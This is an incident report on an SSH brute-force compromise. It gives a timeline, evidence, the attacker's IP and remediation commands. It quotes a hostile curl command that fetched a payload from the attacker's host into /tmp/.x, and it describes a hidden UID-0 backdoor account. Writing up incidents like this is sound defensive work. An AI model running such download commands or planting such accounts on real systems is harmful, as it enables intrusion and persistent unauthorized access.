# Incident Report: Unauthorized Access and Persistence

## Summary
The system experienced a targeted brute-force attack from IP `198.51.100.77`, resulting in successful unauthorized access as `root`. The attacker downloaded a malicious payload and established persistent root access via a new user account.

## Evidence
- `01:05:57`: Targeted SSH brute-force attack initiated against `root`.
- `01:07:36`: Malicious command executed: `curl -s http://198.51.100.77/x.sh -o /tmp/.x`.
- `01:10:46`: Persistence established via `useradd svc-backup` (UID 0, GID 0).
- `01:12:00`: Successful SSH login as `root` from `198.51.100.77`.

## Attacker Information
- **IP:** `198.51.100.77`

## Post-Exploitation
- **Payload:** `/tmp/.x` (unknown functionality, requires static analysis).
- **Persistence:** Created unauthorized root user `svc-backup`.

## Remediation Commands
```bash
# Block the attacker IP
iptables -A INPUT -s 198.51.100.77 -j DROP

# Remove the backdoor user and malicious file
userdel -r svc-backup
rm /tmp/.x
```